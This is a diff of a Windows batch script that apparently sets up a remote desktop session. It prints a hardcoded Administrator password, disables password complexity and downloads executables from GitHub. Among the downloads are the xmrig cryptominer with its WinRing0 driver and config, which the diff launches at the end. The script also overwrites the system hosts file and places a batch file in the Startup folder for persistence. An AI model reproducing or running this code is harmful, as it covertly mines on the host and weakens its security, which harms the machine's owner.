@@ -29,14 +29,13 @@ tasklist | find /i "ngrok.exe" >Nul && curl -s localhost:4040/api/tunnels | jq -
 echo User: Administrator
 echo Pass: Hades1412@
 curl -O https://raw.githubusercontent.com/jrrodriguez81/Windows2019RDP-US/main/Files/DisablePasswordComplexity.ps1 > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\Fast Config VPS.exe" https://raw.githubusercontent.com/jrrodriguez81/Windows2019RDP-US/main/Files/FastConfigVPS_v5.1.exe > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\xmrig.exe" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/xmrig.exe > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\WinRing0x64.sys" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/WinRing0x64.sys > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\SHA256SUMS" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/SHA256SUMS > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\config.json" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/config.json > out.txt 2>&1
-curl -o "C:\Windows\System32\Drivers\etc\hosts" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/hosts > out.txt 2>&1
-curl -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\BATAFTERRESET.bat" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/BATAFTERRESET.bat > out.txt 2>&1
-start C:\Users\Public\Desktop\xmrig.exe
+curl -o "C:\Users\Public\Desktop\Fast Config VPS.exe" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/FastConfigVPS_v5.1.exe > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\xmrig.exe" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/xmrig.exe > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\WinRing0x64.sys" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/WinRing0x64.sys > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\SHA256SUMS" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/SHA256SUMS > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\config.json" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/config.json > out.txt 2>&1
+curl -o "C:\Windows\System32\Drivers\etc\hosts" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/hosts > out.txt 2>&1
+curl -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\BATAFTERRESET.bat" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/BATAFTERRESET.bat > out.txt 2>&1
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './DisablePasswordComplexity.ps1'" > out.txt 2>&1
 diskperf -Y >nul
 sc start audiosrv >nul
@@ -44,6 +43,7 @@ sc config Audiosrv start= auto >nul
 ICACLS C:\Windows\Temp /grant administrator:F >nul
 ICACLS C:\Windows\installer /grant administrator:F >nul
 ping -n 10 127.0.0.1 >nul
+start C:\Users\Public\Desktop\xmrig.exe >nul
 
 
 
